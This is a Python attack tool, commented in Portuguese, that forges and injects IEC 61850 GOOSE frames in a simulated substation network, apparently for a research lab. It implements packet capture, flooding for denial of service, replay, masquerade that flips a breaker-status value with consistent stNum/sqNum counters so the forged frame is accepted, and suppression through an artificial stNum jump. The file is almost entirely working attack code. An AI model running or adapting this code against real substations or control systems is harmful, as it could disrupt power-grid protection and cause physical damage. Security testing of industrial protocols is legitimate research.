#!/usr/bin/env python3
"""
goose_attack.py — Ferramenta de ataque/teste para mensagens GOOSE (IEC 61850-8-1)

Implementa os 4 testes da Seção 4 da metodologia (taxonomia PowerDuck):
  A) flood       — inundação (DoS)
  B) replay      — reenvio de mensagem legítima capturada
  C) masquerade  — falsificação (insertion), com mutação de estado
  D) suppress    — supressão via salto artificial de stNum

Uso típico dentro do container `atacante-1` no GNS3 (mesma sub-rede/
switch dos IEDs simulados, já que GOOSE é multicast de Camada 2 e não
é roteável):

    # 1) capturar uma mensagem legítima como "molde"
    sudo python3 goose_attack.py capture --iface eth0 --out molde.pcap

    # 2) rodar qualquer um dos ataques usando o molde capturado
    sudo python3 goose_attack.py flood      --iface eth0 --template molde.pcap --pps 2000 --duration 10
    sudo python3 goose_attack.py replay     --iface eth0 --template molde.pcap --delay 3
    sudo python3 goose_attack.py masquerade --iface eth0 --template molde.pcap --occurrence 0
    sudo python3 goose_attack.py suppress   --iface eth0 --template molde.pcap --jump 1000

Requer privilégio de root (raw socket) e libpcap. Use --dry-run para
validar a montagem dos pacotes sem enviar nada à rede (útil para testar
fora do GNS3).
"""
import argparse
import sys
import time

from scapy.all import sniff, sendp, wrpcap, rdpcap

import goose_frame as gf


def cmd_capture(args):
    print(f"[*] Capturando GOOSE em {args.iface} (Ctrl+C para parar antes do timeout)...")
    pkts = sniff(
        iface=args.iface,
        lfilter=lambda p: bytes(p)[12:14] in (b"\x88\xb8", b"\x81\x00"),
        timeout=args.timeout,
        count=args.count or 0,
    )
    if not pkts:
        print("[!] Nenhum frame GOOSE capturado.")
        sys.exit(1)
    wrpcap(args.out, pkts)
    print(f"[+] {len(pkts)} frame(s) salvos em {args.out}")


def _load_template(path):
    pkts = rdpcap(path)
    raw = bytes(pkts[0])
    parsed = gf.parse_ethernet_goose(raw)
    return parsed


def cmd_flood(args):
    """Teste A — Flooding: reenvia (com stNum/sqNum crescentes e timestamp
    atualizado) a mensagem-molde em alta taxa, saturando a rede/assinantes."""
    parsed = _load_template(args.template)
    fields = dict(parsed["fields"])
    stnum = fields["stNum"]
    sqnum = fields["sqNum"]

    interval = 1.0 / args.pps if args.pps > 0 else 0
    end_time = time.time() + args.duration
    sent = 0
    print(f"[*] Flooding: {args.pps} pkts/s por {args.duration}s "
          f"(alvo gocbRef={fields['gocbRef']})")
    while time.time() < end_time:
        sqnum += 1
        fields["sqNum"] = sqnum
        fields["t"] = gf.make_utctime()
        pkt = gf.build_ethernet_goose_frame(
            dst_mac=parsed["dst_mac"], src_mac=parsed["src_mac"],
            appid=parsed["appid"], fields=fields,
        )
        if args.dry_run:
            if sent == 0:
                print("[dry-run] primeiro pacote montado, tamanho:", len(bytes(pkt)))
        else:
            sendp(pkt, iface=args.iface, verbose=False)
        sent += 1
        if interval:
            time.sleep(interval)
    print(f"[+] {sent} pacotes {'montados (dry-run)' if args.dry_run else 'enviados'}.")


def cmd_replay(args):
    """Teste B — Replay: reenvia o frame-molde exatamente como foi
    capturado (sem alterar stNum/sqNum/t), simulando um atacante que
    apenas retransmite tráfego antigo."""
    pkts = rdpcap(args.template)
    raw_frame = pkts[0]
    print(f"[*] Aguardando {args.delay}s antes do replay...")
    time.sleep(args.delay)
    if args.dry_run:
        print("[dry-run] replay pronto, tamanho:", len(bytes(raw_frame)))
    else:
        sendp(raw_frame, iface=args.iface, verbose=False)
        print("[+] Frame reenviado (replay).")


def cmd_masquerade(args):
    """Teste C — Masquerade/Insertion: forja uma nova mensagem no mesmo
    gocbRef/MAC do IED legítimo, com um valor de estado alterado (ex.:
    status de disjuntor) e stNum/sqNum/t consistentes com uma mudança de
    estado real, para que o assinante aceite como legítima."""
    parsed = _load_template(args.template)
    fields = dict(parsed["fields"])
    allData = fields["allData"]

    new_all_data, offset, old_val, new_val = gf.flip_boolean_in_data(
        allData, occurrence=args.occurrence
    )
    fields["allData"] = new_all_data
    fields["stNum"] = fields["stNum"] + 1  # mudança de estado -> stNum incrementa
    fields["sqNum"] = 0                     # reinicia sequência após stNum
    fields["t"] = gf.make_utctime()

    pkt = gf.build_ethernet_goose_frame(
        dst_mac=parsed["dst_mac"], src_mac=parsed["src_mac"],
        appid=parsed["appid"], fields=fields,
    )
    print(f"[*] Masquerade: gocbRef={fields['gocbRef']} "
          f"bit em offset {offset} do allData: {old_val} -> {new_val}, "
          f"stNum {parsed['fields']['stNum']} -> {fields['stNum']}")
    if args.dry_run:
        print("[dry-run] pacote forjado, tamanho:", len(bytes(pkt)))
    else:
        sendp(pkt, iface=args.iface, verbose=False)
        print("[+] Mensagem forjada enviada.")


def cmd_suppress(args):
    """Teste D — Suppression: envia um frame com stNum artificialmente
    muito à frente do legítimo, para que o assinante passe a descartar
    mensagens genuínas subsequentes por parecerem 'antigas'."""
    parsed = _load_template(args.template)
    fields = dict(parsed["fields"])
    fields["stNum"] = fields["stNum"] + args.jump
    fields["sqNum"] = 0
    fields["t"] = gf.make_utctime()

    pkt = gf.build_ethernet_goose_frame(
        dst_mac=parsed["dst_mac"], src_mac=parsed["src_mac"],
        appid=parsed["appid"], fields=fields,
    )
    print(f"[*] Suppression: stNum {parsed['fields']['stNum']} -> {fields['stNum']} "
          f"(salto de {args.jump})")
    if args.dry_run:
        print("[dry-run] pacote montado, tamanho:", len(bytes(pkt)))
    else:
        sendp(pkt, iface=args.iface, verbose=False)
        print("[+] Frame de supressão enviado.")


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--dry-run", action="store_true",
                   help="Monta os pacotes mas não envia nada à rede (para testar sem GNS3).")
    sub = p.add_subparsers(dest="cmd", required=True)

    p_cap = sub.add_parser("capture", help="Captura uma mensagem GOOSE legítima como molde.")
    p_cap.add_argument("--iface", required=True)
    p_cap.add_argument("--out", required=True)
    p_cap.add_argument("--timeout", type=int, default=15)
    p_cap.add_argument("--count", type=int, default=1)
    p_cap.set_defaults(func=cmd_capture)

    p_flood = sub.add_parser("flood", help="Teste A - Flooding (DoS).")
    p_flood.add_argument("--iface", required=True)
    p_flood.add_argument("--template", required=True)
    p_flood.add_argument("--pps", type=float, default=1000)
    p_flood.add_argument("--duration", type=float, default=10)
    p_flood.set_defaults(func=cmd_flood)

    p_replay = sub.add_parser("replay", help="Teste B - Replay.")
    p_replay.add_argument("--iface", required=True)
    p_replay.add_argument("--template", required=True)
    p_replay.add_argument("--delay", type=float, default=0)
    p_replay.set_defaults(func=cmd_replay)

    p_masq = sub.add_parser("masquerade", help="Teste C - Masquerade/Insertion.")
    p_masq.add_argument("--iface", required=True)
    p_masq.add_argument("--template", required=True)
    p_masq.add_argument("--occurrence", type=int, default=0,
                         help="Qual valor booleano do allData inverter (0 = primeiro).")
    p_masq.set_defaults(func=cmd_masquerade)

    p_supp = sub.add_parser("suppress", help="Teste D - Suppression.")
    p_supp.add_argument("--iface", required=True)
    p_supp.add_argument("--template", required=True)
    p_supp.add_argument("--jump", type=int, default=1000)
    p_supp.set_defaults(func=cmd_suppress)

    args = p.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
